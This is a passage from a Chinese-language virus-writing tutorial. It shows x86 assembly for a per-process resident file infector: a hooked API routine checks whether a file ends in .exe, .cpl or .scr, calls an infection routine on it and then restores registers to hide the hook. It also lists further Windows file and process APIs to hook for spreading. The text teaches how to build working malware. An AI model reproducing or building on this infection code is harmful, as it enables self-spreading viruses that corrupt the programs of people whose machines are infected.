
```
  cmp     al,"."                    ; Dot found? Interesting...  

        jnz     reach\_dot                  ; If not, loop again  

        dec     esi                   ; Fix it  

  lodsd                     ; Put extension in EAX  

        or      eax,20202020h             ; Make string lowercase  

  cmp     eax,"exe."                 ; Is it an EXE? Infect!!!  

        jz      InfectWithHookStuff  

        cmp     eax,"lpc."                 ; Is it a CPL? Infect!!!  

        jz      InfectWithHookStuff  

        cmp     eax,"rcs."                 ; Is is a SCR? Infect!!!  

        jnz     ErrorDoHookStuff  

 InfectWithHookStuff:  

        xchg    edi,edx                   ; EDI = Filename to infect  

        call    InfectEDI                 ; Infect file!! ;)  

 ErrorDoHookStuff:  

  popfd                     ; Preserve all as if nothing  

  popad                     ; happened :)  

  push    ebp  

  call    GetDeltaOffset          ; Get delta offset  

        xchg    eax,ebp                   ; Put delta offset in EAX  

  pop     ebp  

  ret  

;---------到这里为止剪切-------------------------------------------------------------
```

一些可以用这个一般的例程来 hook 的 API 如下：

`MoveFileA`, `CopyFileA`, `GetFullPathNameA`, `DeleteFileA`, `WinExec`, `CreateFileA`

`CreateProcessA`, `GetFileAttributesA`, `SetFileAttributesA`, `_lopen`, `MoveFileExA`

`CopyFileExA`, `OpenFile`。

### 最后的话

如果还有什么不清楚的地方，发 email 给我。我将尽可能地用一个简单的 `per-process` 驻留的病毒来阐述它，但是我编写的唯一一个 `per-process` 病毒太复杂了，而且比这有更多的特色，所以对你来说还是看不明白 :)

`4dd466d0e1e0cc123afbe504da2462ca`
